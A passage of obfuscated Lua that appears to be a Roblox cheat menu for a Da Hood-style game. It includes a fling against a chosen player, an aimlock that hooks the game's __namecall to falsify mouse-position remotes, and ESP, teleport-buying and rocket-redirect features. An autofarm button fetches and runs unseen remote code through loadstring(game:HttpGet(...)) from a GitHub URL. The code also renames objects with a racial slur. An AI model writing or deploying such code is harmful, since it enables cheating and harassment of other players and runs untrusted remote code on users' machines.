                                    Idleing = false
                                    for s, O in pairs(c.Character.Humanoid:GetPlayingAnimationTracks()) do
                                        if O.Animation.AnimationId == "rbxassetid://3541114300" then
                                            Idleing = true
                                        end
                                    end
                                    if Idleing == false and flying == true then
                                        dA:Play()
                                    end
                                end
                                local dh = function()
                                    dg = game:GetService("RunService").Heartbeat:Connect(df)
                                end
                                local di = function()
                                    dg:Disconnect()
                                    Idleing2 = false
                                end
                                dh()
                                repeat
                                    wait()
                                until du.r ~= 0 or du.l ~= 0 or du.b ~= 0 or du.f ~= 0 or flying == false
                                di()
                            end
                        end
                    )
                    av()
                    c.CharacterAdded:Connect(
                        function()
                            repeat
                                wait()
                            until c.Character
                            wait(1)
                            av()
                        end
                    )
                end
            end
        )
        aw.MouseButton1Click:Connect(
            function()
                if aw.Text == "Fling" then
                    aw.Text = "Unfling"
                    local dg
                    local dG = c.Character.HumanoidRootPart.Position
                    local df = function()
                        local V, W =
                            pcall(
                            function()
                                local dH = b:FindFirstChild(am.Text).Character
                                if dH and c.Character then
                                    FlingTorso = dH.UpperTorso
                                    local dI = 3.85
                                    local increase = 6
                                    if dH.Humanoid.MoveDirection.X < 0 then
                                        xchange = -increase
                                    elseif dH.Humanoid.MoveDirection.X > 0 then
                                        xchange = increase
                                    else
                                        xchange = 0
                                    end
                                    if dH.Humanoid.MoveDirection.Z < 0 then
                                        zchange = -increase
                                    elseif dH.Humanoid.MoveDirection.Z > 0 then
                                        zchange = increase
                                    else
                                        zchange = 0
                                    end
                                    if c.Character then
                                        c.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(11)
                                        c.Character.HumanoidRootPart.CFrame =
                                            CFrame.new(
                                            FlingTorso.Position.X + math.random(-dI, dI) + xchange,
                                            FlingTorso.Position.Y,
                                            FlingTorso.Position.Z + math.random(-dI, dI) + zchange
                                        ) *
                                            CFrame.Angles(
                                                math.rad(c.Character.HumanoidRootPart.Orientation.X + 350),
                                                math.rad(c.Character.HumanoidRootPart.Orientation.Y + 200),
                                                math.rad(c.Character.HumanoidRootPart.Orientation.Z + 240)
                                            )
                                        c.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
                                    end
                                end
                            end
                        )
                        if W then
                            print("fling error : " .. W)
                        end
                    end
                    local dh = function()
                        dG = c.Character.HumanoidRootPart.Position
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                        local dJ = Vector3.new(0, 0, 0)
                        c.Character.PrimaryPart.Velocity = dJ
                        c.Character.PrimaryPart.RotVelocity = dJ
                        c.Character.HumanoidRootPart.CFrame =
                            CFrame.new(dG) * CFrame.Angles(math.rad(0), math.rad(137.92), math.rad(0))
                    end
                    dh()
                    repeat
                        wait()
                    until aw.Text == "Fling"
                    di()
                else
                    aw.Text = "Fling"
                end
            end
        )
        bt.BackgroundColor3 = red
        bs.MouseButton1Click:Connect(
            function()
                if bt.BackgroundColor3 == red then
                    bt.BackgroundColor3 = green
                else
                    bt.BackgroundColor3 = red
                end
            end
        )
        bV.BackgroundColor3 = red
        bU.MouseButton1Click:Connect(
            function()
                if bV.BackgroundColor3 == red then
                    bV.BackgroundColor3 = green
                    local dg
                    local df = function()
                        local dK =
                            c.Character.BodyEffects.Movement:FindFirstChild("NoJumping") or
                            c.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") or
                            c.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed")
                        if dK then
                            dK:Destroy()
                        end
                        if c.Character.BodyEffects.Reload.Value == true then
                            c.Character.BodyEffects.Reload.Value = false
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bV.BackgroundColor3 == red
                    di()
                else
                    bV.BackgroundColor3 = red
                end
            end
        )
        bN.BackgroundColor3 = red
        bM.MouseButton1Click:Connect(
            function()
                if bN.BackgroundColor3 == red then
                    bN.BackgroundColor3 = green
                    local dg
                    local df = function()
                        for s, O in pairs(game:GetService("Workspace")["Ignored"]["Drop"]:GetChildren()) do
                            if O:IsA("Part") then
                                if (O.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                                    fireclickdetector(O:FindFirstChild("ClickDetector"))
                                end
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bN.BackgroundColor3 == red
                    di()
                else
                    bN.BackgroundColor3 = red
                end
            end
        )
        bv.BackgroundColor3 = red
        bu.MouseButton1Click:Connect(
            function()
                if bv.BackgroundColor3 == red then
                    bv.BackgroundColor3 = green
                else
                    bv.BackgroundColor3 = red
                end
            end
        )
        bJ.BackgroundColor3 = red
        bI.MouseButton1Click:Connect(
            function()
                if bJ.BackgroundColor3 == red then
                    bJ.BackgroundColor3 = green
                    local dg
                    local df = function()
                        if c.Character.BodyEffects["K.O"].Value == true then
                            local cf = game.Players.LocalPlayer.Character
                            cf.LowerTorso:Destroy()
                            cf.UpperTorso:Destroy()
                            cf.LeftUpperLeg:Destroy()
                            cf.RightUpperLeg:Destroy()
                            cf.RightLowerLeg:Destroy()
                            cf.LeftLowerLeg:Destroy()
                            cf.LeftUpperArm:Destroy()
                            cf.RightUpperArm:Destroy()
                            cf.RightLowerArm:Destroy()
                            cf.LeftLowerArm:Destroy()
                            cf.Head:Destroy()
                            cf.Righthand:Destroy()
                            cf.Lefthand:Destroy()
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bJ.BackgroundColor3 == red
                    di()
                else
                    bJ.BackgroundColor3 = red
                end
            end
        )
        bL.BackgroundColor3 = red
        bK.MouseButton1Click:Connect(
            function()
                if bL.BackgroundColor3 == red then
                    bL.BackgroundColor3 = green
                    local dg
                    local df = function()
                        local dL = {
                            "[RPG]",
                            "[SMG]",
                            "[TacticalShotgun]",
                            "[AK47]",
                            "[AUG]",
                            "[Glock]",
                            "[Shotgun]",
                            "[Flamethrower]",
                            "[Silencer]",
                            "[AR]",
                            "[Revolver]",
                            "[SilencerAR]",
                            "[LMG]",
                            "[P90]",
                            "[DrumGun]",
                            "[Double-Barrel SG]",
                            "[Hamburger]",
                            "[Chicken]",
                            "[Pizza]",
                            "[Cranberry]",
                            "[Donut]",
                            "[Taco]",
                            "[Starblox Latte]",
                            "[BrownBag]",
                            "[Weights]",
                            "[HeavyWeights]"
                        }
                        local M = false
                        for n, O in pairs(game.Workspace.Players:GetChildren()) do
                            if (O.UpperTorso.Position - c.Character.HumanoidRootPart.Position).Magnitude <= MaxDistance then
                                if
                                    O.BodyEffects.Attacking.Value == true and
                                        not table.find(dL, O:FindFirstChildWhichIsA("Tool").Name) and
                                        O.Name ~= c.Name
                                 then
                                    M = true
                                    MainEvent:FireServer("Block", c.Name)
                                end
                            end
                        end
                        if M == false and HoldingF == false then
                            if c.Character.BodyEffects:FindFirstChild("Block") then
                                c.Character.BodyEffects.Block:Destroy()
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bL.BackgroundColor3 == red
                    di()
                else
                    bL.BackgroundColor3 = red
                end
            end
        )
        bz.BackgroundColor3 = red
        by.MouseButton1Click:Connect(
            function()
                if bz.BackgroundColor3 == red then
                    bz.BackgroundColor3 = green
                    local dg
                    local df = function()
                        MainEvent:FireServer("Stomp")
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bz.BackgroundColor3 == red
                    di()
                else
                    bz.BackgroundColor3 = red
                end
            end
        )
        bD.BackgroundColor3 = red
        bC.MouseButton1Click:Connect(
            function()
                if bD.BackgroundColor3 == red then
                    bD.BackgroundColor3 = green
                    local dg
                    local df = function()
                        for n, O in pairs(game:GetService("Players"):GetChildren()) do
                            if O.Character and O.DataFolder.Officer.Value == 1 then
                                if
                                    (O.Character.HumanoidRootPart.Position - c.Character.HumanoidRootPart.Position).Magnitude <=
                                        30 and c.Character.BodyEffects["K.O"].Value == true
                                 then
                                    c.Character:Destroy()
                                end
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bD.BackgroundColor3 == red
                    di()
                else
                    bD.BackgroundColor3 = red
                end
            end
        )
        bH.BackgroundColor3 = red
        bG.MouseButton1Click:Connect(
            function()
                if bH.BackgroundColor3 == red then
                    bH.BackgroundColor3 = green
                    local dg
                    local df = function()
                        if game.Players.LocalPlayer.Character.BodyEffects.Armor.Value < 10 then
                            savedhumanoidpos2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-933.992, -25.252, 569.829)
                            wait(0.1)
                            fireclickdetector(game.Workspace.Ignored.Shop["[High-Medium Armor] - $2300"].ClickDetector)
                            wait()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savedhumanoidpos2)
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bH.BackgroundColor3 == red
                    di()
                else
                    bH.BackgroundColor3 = red
                end
            end
        )
        bx.BackgroundColor3 = red
        bw.MouseButton1Click:Connect(
            function()
                if bx.BackgroundColor3 == red then
                    bx.BackgroundColor3 = green
                    NamePos = c.Character.HumanoidRootPart.CFrame
                    local dg
                    local df = function()
                        local dM = c.Character:FindFirstChild("In-gameMask")
                        local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                        if not dM then
                            local dN = c.Character:FindFirstChild("Mask") or c.Backpack:FindFirstChild("Mask")
                            if dN then
                                local dO = c.Backpack:FindFirstChild("Mask")
                                if dO then
                                    cO:EquipTool(dO)
                                    wait(0.1)
                                end
                                dN:Activate()
                            else
                                local dP = "Mask"
                                local d6 = 60
                                local d7 =
                                    game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].ClickDetector
                                local d8 =
                                    game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].Head.Position
                                local function d9()
                                    wait()
                                    c.Character.HumanoidRootPart.CFrame = CFrame.new(d8)
                                    fireclickdetector(d7)
                                    if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                                        c.Character.LeftHand.Position = c.Character.LeftLowerArm.Position
                                        c.Character.RightHand.Position = c.Character.RightLowerArm.Position
                                    end
                                end
                                repeat
                                    d9()
                                until c.Backpack:FindFirstChild(dP) or c.DataFolder.Currency.Value <= d6 or
                                    c.Character:FindFirstChild(dP)
                                c.Character.HumanoidRootPart.CFrame = NamePos
                                if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                                    c.Character.LeftHand.Position = c.Character.LeftLowerArm.Position
                                    c.Character.RightHand.Position = c.Character.RightLowerArm.Position
                                end
                            end
                        else
                            local dQ = c.Character:FindFirstChild("In-gameMask"):FindFirstChild("Handle")
                            if dQ then
                                dQ:Destroy()
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bx.BackgroundColor3 == red
                    di()
                else
                    bx.BackgroundColor3 = red
                end
            end
        )
        bT.BackgroundColor3 = red
        bS.MouseButton1Click:Connect(
            function()
                if bT.BackgroundColor3 == red then
                    bT.BackgroundColor3 = green
                    local dg
                    local df = function()
                        if c.Character:FindFirstChild("Christmas_Sock") then
                            c.Character:FindFirstChild("Christmas_Sock"):Destroy()
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bT.BackgroundColor3 == red
                    di()
                else
                    bT.BackgroundColor3 = red
                end
            end
        )
        bR.BackgroundColor3 = red
        bQ.MouseButton1Click:Connect(
            function()
                if bR.BackgroundColor3 == red then
                    bR.BackgroundColor3 = green
                    local dg
                    local df = function()
                        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health < 70 then
                            lastpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-789.114, -39.6752, -942.038)
                            wait(0.1)
                            fireclickdetector(game.Workspace.Ignored.Shop["[Pizza] - $5"].ClickDetector)
                            wait()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastpos)
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bR.BackgroundColor3 == red
                    di()
                else
                    bR.BackgroundColor3 = red
                end
            end
        )
        bB.BackgroundColor3 = red
        bA.MouseButton1Click:Connect(
            function()
                if bB.BackgroundColor3 == red then
                    bB.BackgroundColor3 = green
                    local dg
                    local df = function()
                        local dR = game:GetService("Workspace"):FindFirstChild("Ignored"):FindFirstChild("MyLauncher")
                        if dR and COOLDOWN == true then
                            local dS =
                                game:GetService("Workspace"):FindFirstChild("Ignored"):FindFirstChild("RocketPart")
                            if not dS then
                                local dS = Instance.new("Part", game.Workspace.Ignored)
                                dS.Name = "RocketPart"
                                dS.Anchored = true
                                dS.CanCollide = true
                                dS.Transparency = 1
                                dS.Position = Vector3.new(dR.Position.X, dR.Position.Y + 1.4, dR.Position.Z)
                                c.Character.HumanoidRootPart.CFrame =
                                    CFrame.new(dS.Position.X, dS.Position.Y + 2, dS.Position.Z) *
                                    CFrame.Angles(
                                        math.rad(c.Character.HumanoidRootPart.Orientation.X),
                                        math.rad(c.Character.HumanoidRootPart.Orientation.Y),
                                        math.rad(c.Character.HumanoidRootPart.Orientation.Z)
                                    )
                                RIDING = true
                            else
                                dS.Position = Vector3.new(dR.Position.X, dR.Position.Y + 1.4, dR.Position.Z)
                                c.Character.HumanoidRootPart.CFrame =
                                    CFrame.new(dS.Position.X, dS.Position.Y + 2.3, dS.Position.Z) *
                                    CFrame.Angles(
                                        math.rad(c.Character.HumanoidRootPart.Orientation.X),
                                        math.rad(c.Character.HumanoidRootPart.Orientation.Y),
                                        math.rad(c.Character.HumanoidRootPart.Orientation.Z)
                                    )
                                RIDING = true
                            end
                        else
                            for s, O in pairs(game:GetService("Workspace"):FindFirstChild("Ignored"):GetChildren()) do
                                if O.Name == "RocketPart" then
                                    O:Destroy()
                                end
                                RIDING = false
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bB.BackgroundColor3 == red
                    di()
                else
                    bB.BackgroundColor3 = red
                end
            end
        )
        bF.BackgroundColor3 = red
        bE.MouseButton1Click:Connect(
            function()
                if bF.BackgroundColor3 == red then
                    bF.BackgroundColor3 = green
                    local dg
                    local df = function()
                        if _G.DeflectRockets == true then
                            _G.DeflectRockets = false
                        else
                            _G.DeflectRockets = true
                        end
                        while _G.DeflectRockets == true and game:GetService("RunService").Stepped:Wait() do
                            setsimulationradius(9e9 ^ 9e9, 9e9)
                            for n, dT in next, game.Workspace.Ignored:GetChildren() do
                                if
                                    dT.Name == "Launcher" and
                                        (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                            dT.Position).Magnitude <= 250
                                 then
                                    dT.Name = "negro"
                                    local dU = dT:FindFirstChild("BodyVelocity")
                                    local dV = dU.Velocity
                                    local dW = dU.P
                                    dU:Destroy()
                                    local dX = Instance.new("BodyVelocity", dT)
                                    dX.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    dX.P = dW
                                    dX.Velocity = -dV
                                end
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bF.BackgroundColor3 == red
                    di()
                else
                    bF.BackgroundColor3 = red
                end
            end
        )
        bP.BackgroundColor3 = red
        bO.MouseButton1Click:Connect(
            function()
                if bP.BackgroundColor3 == red then
                    bP.BackgroundColor3 = green
                    c.PlayerGui.Framework.FBAnimation.Name = "yea"
                    local dg
                    local df = function()
                        local dY =
                            c.Character.UpperTorso:FindFirstChild("ElectricuteParticle") or
                            c.Character.UpperTorso:FindFirstChild("FlamethrowerFireParticle")
                        if dY then
                            dY:Destroy()
                        end
                        for s, O in pairs(c.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
                            if O.Animation.AnimationId == "rbxassetid://5641749824" then
                                O:Stop()
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until bP.BackgroundColor3 == red
                    di()
                else
                    bP.BackgroundColor3 = red
                    c.PlayerGui.Framework.yea.Name = "FBAnimation"
                end
            end
        )
        DS = 75
        DT = 5
        RpgTimer = DS
        Distance = DT
        RPGTarget = "None"
        local w = getrawmetatable(game)
        pos = Vector3.new(0, 0, 0)
        local cr = w.__namecall
        setreadonly(w, false)
        w.__namecall =
            newcclosure(
            function(self, ...)
                local r = {...}
                if getnamecallmethod() == "FireServer" and self.Name == "MainEvent" then
                    if tostring(r[1]) == "UpdateMousePos" then
                        if Aimlocked ~= nil then
                            r[2] = pos
                        end
                    end
                end
                return cr(self, unpack(r))
            end
        )
        b9.MouseButton1Click:Connect(
            function()
                OldInvisCFrame = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame = CFrame.new(318.499, 93.825, -919.513)
                wait(0.1)
                c.Character:BreakJoints()
                wait(0.1)
                c.Character.HumanoidRootPart.CFrame = OldInvisCFrame
            end
        )
        b5.MouseButton1Click:Connect(
            function()
                if b5.Text == "Spin" then
                    b5.Text = "Unspin"
                    local dg
                    local df = function()
                        c.Character.HumanoidRootPart.CFrame =
                            c.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(50), 0)
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until b5.Text == "Spin"
                    di()
                else
                    b5.Text = "Spin"
                end
            end
        )
        aY.MouseButton1Click:Connect(
            function()
                for s, O in pairs(game.Workspace.Players:GetChildren()) do
                    O:FindFirstChildWhichIsA("Humanoid").DisplayDistanceType = "Subject"
                end
                announce("Showing masked usersnames", "", 3)
            end
        )
        aZ.MouseButton1Click:Connect(
            function()
                if aZ.Text == "MoneyESP" then
                    aZ.Text = "UnmoneyESP"
                    local dg
                    local df = function()
                        for s, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
                            if O.Name == "MoneyDrop" then
                                O.BillboardGui.AlwaysOnTop = true
                                O.BillboardGui.Size = UDim2.new(0, 25, 0, 25)
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait(1)
                    until aZ.Text == "MoneyESP"
                    di()
                else
                    aZ.Text = "MoneyESP"
                    for s, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
                        if O.Name == "MoneyDrop" then
                            O.BillboardGui.AlwaysOnTop = false
                            O.BillboardGui.Size = UDim2.new(1, 0, 1, 0)
                        end
                    end
                end
            end
        )
        b2.MouseButton1Click:Connect(
            function()
                if b2.Text == "Esp" then
                    b2.Text = "Unesp"
                    local dg
                    local df = function()
                        for n, O in pairs(b:GetChildren()) do
                            if O.Character then
                                if not O.Character.UpperTorso:FindFirstChild("ESP") then
                                    local dZ = Instance.new("BillboardGui", O.Character.UpperTorso)
                                    dZ.StudsOffset = Vector3.new(0, 3, 0)
                                    dZ.Size = UDim2.new(4, 0, 1, 0)
                                    dZ.AlwaysOnTop = true
                                    dZ.Name = "ESP"
                                    local d_ = Instance.new("TextLabel", dZ)
                                    d_.Text = O.Name .. " | " .. O.DisplayName
                                    d_.BackgroundTransparency = 1
                                    d_.Size = UDim2.new(1, 0, 1, 0)
                                    d_.TextColor3 = green
                                end
                            end
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until b2.Text == "Esp"
                    di()
                else
                    b2.Text = "Esp"
                    for n, O in pairs(b:GetChildren()) do
                        if O.Character then
                            if O.Character.UpperTorso:FindFirstChild("ESP") then
                                O.Character.UpperTorso:FindFirstChild("ESP"):Destroy()
                            end
                        end
                    end
                end
            end
        )
        b1.MouseButton1Click:Connect(
            function()
                if c.Character:FindFirstChildWhichIsA("Tool") then
                    c.Character:FindFirstChildWhichIsA("Tool").Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0, 1, 0, 0, 0, -1)
                else
                    announce("HighTool Error", "you have to be holding a tool", 5)
                end
            end
        )
        b3.MouseButton1Click:Connect(
            function()
                if c.Character:FindFirstChildWhichIsA("Tool") then
                    if
                        c.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Handle"):FindFirstChildWhichIsA(
                            "BillboardGui"
                        )
                     then
                        c.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Handle"):FindFirstChildWhichIsA(
                            "BillboardGui"
                        ):Destroy()
                    else
                        announce("LastingBullets Error", "you have to be holding a gun", 5)
                    end
                else
                    announce("LastingBullets Error", "you have to be holding a gun", 5)
                end
            end
        )
        b4.MouseButton1Click:Connect(
            function()
                if b4.Text == "Stamina" then
                    b4.Text = "Unstamina"
                else
                    b4.Text = "Stamina"
                end
            end
        )
        b7.MouseButton1Click:Connect(
            function()
                local e0 = 0
                for s, O in pairs(game.Workspace.Players:GetChildren()) do
                    if not O.UpperTorso:FindFirstChild("OriginalSize") then
                        if O.Name ~= c.Name then
                            e0 = e0 + 1
                        end
                    end
                end
                if e0 > 0 then
                    announce("Found", "A total of " .. tostring(e0) .. " of $-T0P-$ players", 3)
                else
                    announce("D:", "no $-T0P-$ users found", 3)
                end
            end
        )
        aX.MouseButton1Click:Connect(
            function()
                if aX.Text == "Aimlock" then
                    aX.Text = "Unaimlock"
                    announce("Aimlock Enabled", "press e to aimlock", 3)
                    local dg
                    local df = function()
                        local e1 = game.Players:FindFirstChild(Aimlocked).Character
                        if e1 then
                            local e2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                            local e3 = string.split(e2, "(")
                            local e4 = tonumber(e3[1])
                            local xchange
                            local zchange
                            if e4 < 70 then
                                increase = 0.4
                            elseif e4 < 140 then
                                increase = 0.57
                            elseif e4 < 200 then
                                increase = 0.7
                            elseif e4 < 350 then
                                increase = 1.2
                            else
                                increase = 1.6
                            end
                            if e1.Humanoid.MoveDirection.X < 0 then
                                xchange = -increase
                            elseif e1.Humanoid.MoveDirection.X > 0 then
                                xchange = increase
                            else
                                xchange = 0
                            end
                            if e1.Humanoid.MoveDirection.Z < 0 then
                                zchange = -increase
                            elseif e1.Humanoid.MoveDirection.Z > 0 then
                                zchange = increase
                            else
                                zchange = 0
                            end
                            pos =
                                Vector3.new(
                                e1.Head.Position.X + e1.Humanoid.MoveDirection.X + xchange,
                                e1.Head.Position.Y,
                                e1.Head.Position.Z + e1.Humanoid.MoveDirection.Z + zchange
                            )
                        else
                            pos = mouse.Hit.p
                        end
                    end
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                    end
                    dh()
                    repeat
                        wait()
                    until aX.Text == "Aimlock"
                    di()
                else
                    aX.Text = "Aimlock"
                    Aimlocked = nil
                end
            end
        )
        AutoFarmWarning = false
        b0.MouseButton1Click:Connect(
            function()
                if AutoFarmWarning == false then
                    AutoFarmWarning = true
                    announce("Autofarm Warning", "press again to begin autofarming, this CANNOT be stopped", 10)
                else
                    announce("Starting Autofarm", ":D", 5)
                    loadstring(
                        game:HttpGet(
                            "https://raw.githubusercontent.com/Topcoldgaming/local-lililililililililililillil-213-2-43-25-24-32-43-523-53-local-fg-repeat-local-ur-loop/main/ur%20mom%20is%20sus"
                        )
                    )()
                end
            end
        )
        b6.MouseButton1Click:Connect(
            function()
                c5()
            end
        )
        a_.MouseButton1Click:Connect(
            function()
                if a_.Text == "Benx" then
                    a_.Text = "Unbenx"
                    wait(0)
                    local e5 = "Yeah Yeah!"
                    local e6 = "All"
                    local e7 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                    e7:FireServer(e5, e6)
                    game.Workspace:FindFirstChildWhichIsA("Camera").CameraSubject =
                        game.Players:FindFirstChild(am.Text).Character.HumanoidRootPart
                    while a_.Text == "Unbenx" do
                        hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
                        pcall(
                            function()
                                hummy.Parent.Pants:Destroy()
                            end
                        )
                        pcall(
                            function()
                                hummy.Parent.Shirt:Destroy()
                            end
                        )
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            game.Players[am.Text].Character.HumanoidRootPart.CFrame +
                            game.Players[am.Text].Character.HumanoidRootPart.CFrame.lookVector * 0.5
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
                        wait(0.1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
                    end
                else
                    a_.Text = "Benx"
                    game.Workspace:FindFirstChildWhichIsA("Camera").CameraSubject =
                        c.Character:FindFirstChildWhichIsA("Humanoid")
                end
            end
        )
        TazerTarget = nil
        GrenadeTarget = nil
        b8.MouseButton1Click:Connect(
            function()
                local function e8()
                    local e9 = Instance.new("Tool", c.Backpack)
                    e9.ToolTip = "Click a player to rpg lock them"
                    e9.CanBeDropped = false
                    e9.RequiresHandle = false
                    e9.Name = "Rpg Lock"
                    e9.Activated:Connect(
                        function()
                            local da = mouse.Target.Parent:FindFirstChild("LowerTorso")
                            if not da then
                                da = mouse.Target.Parent.Parent:FindFirstChild("LowerTorso")
                            end
                            if da then
                                if da.Parent.Name == "SpecialParts" then
                                    RPGTarget = da.Parent.Parent.Parent.Name
                                else
                                    RPGTarget = da.Parent.Name
                                end
                                announce("Rpg locked onto", RPGTarget, 3)
                            else
                                RPGTarget = nil
                                announce("Rpg unlocked", "", 3)
                            end
                        end
                    )
                end
                local function ea()
                    local eb = Instance.new("Tool", c.Backpack)
                    eb.ToolTip = "Click a player to grenade lock them"
                    eb.CanBeDropped = false
                    eb.RequiresHandle = false
                    eb.Name = "Grenade Lock"
                    eb.Activated:Connect(
                        function()
                            local da = mouse.Target.Parent:FindFirstChild("LowerTorso")
                            if not da then
                                da = mouse.Target.Parent.Parent:FindFirstChild("LowerTorso")
                            end
                            if da then
                                if da.Parent.Name == "SpecialParts" then
                                    GrenadeTarget = da.Parent.Parent.Parent.Name
                                else
                                    GrenadeTarget = da.Parent.Name
                                end
                                announce("Grenades locked onto", GrenadeTarget, 5)
                            else
                                TazerTarget = nil
                                announce("Grenades unlocked", "", 3)
                            end
                        end
                    )
                end
                local function ec()
                    local ed = Instance.new("Tool", c.Backpack)
                    ed.ToolTip = "Click a player to tazer lock them"
                    ed.CanBeDropped = false
                    ed.RequiresHandle = false
                    ed.Name = "Tazer Lock"
                    ed.Activated:Connect(
                        function()
                            local da = mouse.Target.Parent:FindFirstChild("LowerTorso")
                            if not da then
                                da = mouse.Target.Parent.Parent:FindFirstChild("LowerTorso")
                            end
                            if da then
                                if da.Parent.Name == "SpecialParts" then
                                    TazerTarget = da.Parent.Parent.Parent.Name
                                else
                                    TazerTarget = da.Parent.Name
                                end
                                announce("Taser locked onto", TazerTarget, 5)
                            else
                                TazerTarget = nil
                                announce("Taser unlocked", "", 3)
                            end
                        end
                    )
                end
                ec()
                e8()
                ea()
                local dg
                local df = function()
                    if RPGTarget ~= nil then
                        local ee =
                            game:GetService("Workspace"):FindFirstChild("Ignored"):FindFirstChild("Launcher") or
                            game:GetService("Workspace"):FindFirstChild("Ignored"):FindFirstChild("MyLauncher")
                        local ef = game:GetService("Workspace").Players:FindFirstChild(RPGTarget)
                        if ee and ef then
                            local eg = ef:FindFirstChild("HumanoidRootPart")
                            if eg then
                                if RpgTimer >= 0 then
                                    ee.CFrame = CFrame.new(eg.Position.X, eg.Position.Y + 5, eg.Position.Z)
                                    RpgTimer = RpgTimer - 1
                                else
                                    ee.CFrame = CFrame.new(eg.Position.X, eg.Position.Y + Distance, eg.Position.Z)
                                    Distance = Distance - 1
                                end
                            else
                                RpgTimer = DS
                                Distance = DT
                            end
                        else
                            RpgTimer = DS
                            Distance = DT
                        end
                    end
                    if TazerTarget ~= nil then
                        if c.Character:FindFirstChild("[Taser]") then
                            local eh = c.Character["[Taser]"]:FindFirstChild("Handle"):FindFirstChild("Part")
                            if eh then
                                local ei =
                                    game.Workspace.Players:FindFirstChild(TazerTarget):FindFirstChild("UpperTorso") or
